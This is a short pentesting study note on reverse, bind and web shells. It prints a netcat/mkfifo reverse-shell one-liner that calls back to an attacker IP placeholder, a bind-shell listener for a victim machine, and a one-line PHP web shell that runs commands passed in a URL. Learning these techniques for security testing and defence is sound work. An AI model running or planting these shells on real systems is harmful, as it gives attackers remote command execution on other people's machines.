# Shells Overview in Cybersecurity / Pentesting

## 1. Reverse Shell

**Definition:** A reverse shell connects from the victim's machine back to the attacker's machine.

**How it works:**

* Attacker sets up a listener on their machine.
* Victim machine initiates a connection to the attacker's listener.

**Use case:** Useful when the victim is behind a firewall or NAT that blocks incoming connections.

**Example (Bash):**

```bash
# Start a listener on the attacker machine
nc -lnvp ATTACKER_PORT

# Connect to the listener
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

---

## 📗 2. Bind Shell

**Definition:** A bind shell opens a port on the victim’s machine and listens for incoming connections from the attacker.

**How it works:**

* Victim sets up a listener on their system.
* Attacker connects to the open port on the victim.

**Use case:** Simple but can be blocked by firewalls due to open ports on the target.

**Example (Netcat):**

```bash
# On victim:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

# On attacker:
nc VICTIM_IP PORT
```

* Listening on a port below 1024 requires root priviliges.

---

## 3. Web Shell

**Definition:** A script placed on a web server that allows command execution via a web interface.

**Common types:** PHP, ASP, JSP

**Use case:** After uploading malicious files via file upload vulnerabilities.

**Example (PHP):**

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Access via: `http://target.com/shell.php?cmd=whoami`
